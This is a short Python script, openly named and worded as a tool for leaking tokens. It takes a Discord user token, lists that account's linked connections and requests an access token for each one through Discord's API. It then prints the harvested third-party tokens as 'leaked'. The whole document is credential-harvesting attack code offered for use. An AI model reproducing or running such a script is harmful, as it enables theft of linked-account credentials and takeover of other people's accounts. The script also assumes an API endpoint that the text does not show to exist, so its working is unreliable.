import requests
import json

def leakconnectedtokens(usertoken):
    apiendpoint = "https://discord.com/api/v9/users/@me/connections"
    headers = {
        "Authorization": usertoken,
        "Content-Type": "application/json"
    }
    
    response = requests.get(apiendpoint, headers=headers)
    
    if response.status_code == 200:
        connections = response.json()
        leakedtokens = {}
        
        for connection in connections:
            connectiontype = connection['type']
            connectionid = connection['id']
            
            tokenendpoint = f"https://discord.com/api/v9/users/@me/connections/{connectiontype}/{connectionid}/access-token"
            tokenresponse = requests.get(tokenendpoint, headers=headers)
            
            if tokenresponse.status_code == 200:
                tokendata = tokenresponse.json()
                leakedtokens[connectiontype] = tokendata.get('access_token')
        
        return leakedtokens
    else:
        return None

usertoken = "your user token here"

leakedtokens = leakconnectedtokens(usertoken)

if leakedtokens:
    print("Connected account tokens leaked:")
    for accounttype, token in leakedtokens.items():
        print(f"{accounttype}: {token}")
else:
    print("Failed to leak connected account tokens")
